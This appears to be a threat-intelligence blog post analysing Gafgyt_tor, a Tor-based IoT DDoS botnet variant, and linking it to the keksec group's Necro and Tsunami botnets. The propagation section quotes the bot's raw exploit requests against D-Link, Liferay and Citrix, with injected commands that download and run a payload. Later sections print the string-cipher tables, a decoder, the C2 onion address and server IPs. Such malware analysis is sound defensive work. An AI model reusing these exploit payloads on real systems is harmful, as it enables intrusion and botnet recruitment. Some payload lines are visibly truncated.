This is the first time we found a Gafgyt variant\nusing the Tor mechanism, so we named the variant Gafgyt_tor. Further analysis revealed\n[that the family is closely related to the Necro family we made public in January, and is behind](https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/)\n[the same group of people, the so-called keksec group [1]](https://mp.weixin.qq.com/s/D30y0qeicKnHmP9Kad-pmg) [[2]. In this blog, we will introduce](https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/)\nGafgyt_tor and sort out other recent botnets operated by this group.\n\nThe key points of this article are as follows.\n\n1. Gafgyt_tor uses Tor to hide C2 communication, over 100 Tor proxies can be built in,\n\nand new samples are continuously updating the proxy list.\n\n2. Gafgyt_tor share the same origin with the Gafgyt samples discturibed by the keksec\n\ngroup, the core function is still DDoS attacks and scanning.\n\n3. The keksec group reuse the code between different bot families.\n\n4. In addition, the keksec group also reuse a bunch of IP addresses for a long time.\n\n## Sample Analysis\n\n### Propagation\n\nThe currently discovered Gafgyt_tor botnet is mainly propagated through Telnet weak\npasswords and the following three vulnerabilities.\n\nD-Link RCE (CVE-2019-16920)\n\n\n-----\n\n```\nPOST /apply_sec.cgi HTTP/1.1\nHost: %s:%d\nUser-Agent: kpin\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\nConnection: close\nReferer: http://%s:%d/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%%0acd%%20%%2Ft\nO%%20.kpin;chmod%%20777%%20.%%2F.kpin;.%2F.kpin;rm%%20-rf%%20.kpin\n\n```\nLiferay Portal RCE\n```\nPOST /api/jsonws/expandocolumn/update-column HTTP/1.1\nHost: %s:%d\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.25.0\nContent-Length: %d\nContent-Type: application/x-www-form-urlencoded\nAuthorization: Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0\n%2BdefaultData=com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&defaultData.userOve\n\n```\nCitrix CVE-2019-19781\n```\n POST /vpns/portal/scripts/newbm.pl HTTP/1.1\n Host: %s:%d\n User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101\nFirefox/71.0\n Accept-Encoding: gzip, deflate\n Accept: */*\n Connection: keep-alive\n NSC_USER: ../../../netscaler/portal/templates/flialwznxz\n NSC_NONCE: 12\n Content-Length: %d\n Content-Type: application/x-www-form-urlencoded\nurl=127.0.0.1&title=%%5B%%25+template.new%%28%%7B%%27BLOCK%%27%%3D%%27print+readpipe%%\nO+.kpin%%3Bchmod+777+.%%2F.kpin%%3B.%%2F.kpin%%3Brm+rf+.kpin%%22%%29%%27%%7D%%29%%25%%5D&desc=desc&UI_inuse=a \n\n### Encryption\n\n```\n\n-----\n\nGafgyt_tor integrates a replacement encryption algorithm for encrypting C2 and sensitive\nstrings to counter detection and static analysis. Sensitive strings include commands, IPC\npathnames, DDoS-related attack strings, etc.\n\nThe following is a comparison of ciphertext and plaintext C2.\n```\n# ciphertext\n'\"?>K!tF>iorZ:ww_uBw3Bw' \n# plaintext\n'wvp3te7pkfczmnnl.onion'\n\n```\nThe Gafgyt_tor variants we detected so far all use the same C2 wvp3te7pkfczmnnl.onion.\n\nSome of the cipher decryption results are as follows.\n```\n# commands\n~-6mvgmv  -  LDSERVER\n1-|     -     UDP\ncD|     -     TCP\nej~-    -    HOLD\n51,U    -    JUNK\nc~6     -     TLS\n6c-     -     STD\n-,6     -     DNS\n6D7,,mv   -   SCANNER\nj,     -     ON\njdd     -     OFF\njge     -     OVH\n.~7DU,1v6m - BLACKNURSE\n# DDoS-related attack\n7~~     -     ALL\n6p,     -     SYN\nv6c     -     RST\ndx,     -     FIN\n7DU     -     ACK\n|6e     -     PSH\n# Scan-related\naDbwwtr3bw - WChnnecihn\naQuq    -     W.1\naEcc    -    WxTT\n74tw!    -    Agent\n1;t=    -    User\n# misc\n|x,<    -    PING\n=ru_Brf_  -  rc.local\n\n```\nThe following is the python decryption code we wrote based on the inverse results.\n\n\n-----\n\n```\n def decode(encoded, encodes):\n  idx = 0\n  decodes = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. '\n  decoded = bytearray()\n  while ( idx < len(encoded)):\n    for table_idx in range(0, 64):\n      if encoded[idx] == encodes[table_idx]:\n        decoded.append(decodes[table_idx])\n    idx += 1\n  print(decoded)\nencodes = b'%q*KC)&F98fsr2to4b3yi_:wB>z=;!k?\"EAZ7.D-md<ex5U~h,j|$v6c1ga+p@un'\nencoded_cc = b'\"?>K!tF>iorZ:ww_uBw3Bw'\ndecode(encoded_cc, encodes)\n\n### Communication\n\n```\nCompared with other Gafgyt variants, the biggest change of Gafgyt_tor is that the C2\ncommunication is based on Tor, which increases the difficulty of detection and blocking. The\nTor-based C2 communication mechanism has been seen in other families we have analyzed\n[before( Matryosh](https://blog.netlab.360.com/matryosh-botnet-is-spreading/) [leethozer](https://blog.netlab.360.com/the-leethozer-botnet/) [moobot ), but this is the first time we encountered it in the Gafgyt](https://blog.netlab.360.com/moobot-0day-unixcctv-dvr/)\nfamily.\n\nCode changes\n\nCompared with other versions, the code structure of the main function of Gafgyt_tor, which\nadds the Tor proxy function, has changed very much, as shown in the following figure.\n\n\n-----\n\nThe original initConnection() function, which is responsible for establishing the C2\nconnection, is gone, replaced by a large section of code responsible for establishing the Tor\nconnection. The newly added Tor-related functions are as follows.\n\nAmong them, tor_socket_init is responsible for initializing a list of proxy nodes, each\ncontaining an ip address and a port.\n\n\n-----\n\nOur analysis shows that the number of proxy nodes integrated in each sample is always\n100+, with a maximum of 173.\n\nAfter initializing the proxy list, the sample will select a random node from the list to enable Tor\ncommunication via tor_retrieve_addr and tor_retrieve_port.\n\nAfter establishing a connection with the Tor proxy, Gafgyt_tor starts requesting\nwvp3te7pkfczmnnl.onion through the darknet waiting for instructions. This C2 address has\nnot changed in the samples we have analyzed, but the communication port is continuously\nchanging.\n\nThe command\n\nThe core function of Gafgyt_tor is still DDoS attack and scanning, so it mostly follows the\ncommon Gafgyt directive, a new directive called LDSERVER has been added. C2 can\nspecify the download server used in Gafgyt_tor's exploit through this directive, as shown in\nthe figure below.\n\n\n-----\n\nThis directive means that C2 can dynamically switch download servers, so that it can quickly\nswitch to a new download server to continue propagation if the current one is blocked.\n\n### Some other things\n\nGafgyt_tor uses a few uncommon coding tricks in addition to the modification of the\ncommunication function.\n\nSingleton mode\n\nSingle instance mode is implemented using Unix domain sockets (an IPC mechanism),\nwhich requires a pathname to be specified, which is also encrypted. As shown below, k4=f2t\nis decrypted to ugrade.\n\nFunction name obfuscation\n\nNone of the Gafgyt_tor samples we collected have been stripped, so the complete symbolic\ninformation is preserved in the samples, and most of the samples are scanned and\npropagated using a function named ak47Scan. In the sample captured on February 24 we\nfound that the function name was obfuscated as a random string, so it can be assumed that\nthe sample is in active development stage and the authors are gradually strengthening\nGafgyt_tor's ability to counter analysis and detection.\n\n\n-----\n\n## Sample origin\n\n\n-----\n\nWhile analyzing the IoC of Gafgyt_tor, we noticed that a download server IP 45.145.185.83\nwas used by Necro botnet, which appeared in early January this year:\n\ngxbrowser.net is one of Necro's 3 C2s, and the above image shows that it has resolved to\nthis download server IP of Gafgyt_tor several times.\n\nFurther analysis shows that this IP and another Necro C2 IP 193.239.147.224 were also\nused as C2 by other versions of Gafgyt and Tsunami botnet in early February, which\napparently share code with Gafgyt_tor.\n\n1. Both have decryption functions named decode, with identical code structures.\n\n2. Both have scan functions named ak47scan and ak47telscan.\n\nTheir decode function decode() differs only in the code table.\n```\n# Code table in the gafgyt sample\n'%q*KC)&F98fsr2to4b3yi_:wB>z=;!k?\"EAZ7.D-md<ex5U~h,j|$v6c1ga+p@un0'\n# Code table in tsunami sample\n'xm@_;w,B-Z*j?nvE|sq1o$3\"7zKC<F)utAr.p%=>4ihgfe6cba~&5Dk2d!8+9Uy:0'\n\n```\nThe following figure is a comparison of their ak47scan() functions, you can see that the\nfunction and structure is actually similar, but there are changes in the way it runs and the\nports it scans.\n\n\n-----\n\nBased on the binary characteristics of the decode() and ak47scan() functions mentioned\nabove, we found more such Tsunami and Gafgyt samples in our sample database, which are\ncharacterized as follows.\n\n1. Tsunami samples appear in mid-August 2020 and are active for a short period of time.\n\n2. Gafgyt samples were spreading intermittently from September to December 2020.\n\n3. From early to mid-February, first Tsunami samples resumed propagation, then Gafgyt,\n\nfollowed by Gafgyt_tor.\n\n4. There are many similarities between the currently spreading Gafgyt_tor variants and\n\nthe previously captured Gafgyt samples, and the code is clearly same origin.\n\n5. These variants of botnet frequently reuse same download server and C2 IP.\n\nWe can see that there was no update in January this year, we guess because the authors\nfocused their efforts on Necro. In terms of binary characteristics, there is no similarity with\nGafgyt_tor as Necro is written in Python, but we see there are some commonalities in\npropagation methods.\n\n1. Both changed different exploits in a short period of time, presumably to improve the\n\npropagation effect.\n\n2. Both adopted the \"develop-and-distribute\" approach to continuously improve the botnet\n\nfunction, resulting in a large number of different samples being distributed in a short\nperiod of time.\n\nBased on the above analysis, we think that Gafgyt_tor and Necro are very likely operated by\nthe same group of people, who have a pool of IP addresses and multiple botnet source\ncodes, and have the ability of continuous development. In actual operation, they form\ndifferent families of botnets, but reuse infrastructure such as IP address, for example, the\nabove-mentioned IP 45.145.185.83 address acts as different C2 for different botnets since\nthe end of last year, the timeline of different functions is roughly shown in the figure below.\n\nHere are some conclusions about the group:\n\n\n-----\n\n1. They have at least the source code for Necro, Gafgyt and Tsunami.\n\n2. They continue to upgrade and rotate the botnets in their hands.\n\n3. They have a pool of IP address resources and reuse them in different botnets.\n\n4. The group also keeps up with n-day vulnerabilities in IoT and use them promptly to\n\nfacilitate their own botnets.\n\nThe timeline chart below shows the Linux IoT botnet family operated by this group that we\ndetected from last August to now.\n\n## Contact us\n\nReaders are always welcomed to reach us on twitter, or email to netlab at 360 dot cn.\n\n## IoC\n\nMD5\n\n\n-----\n\n```\n#
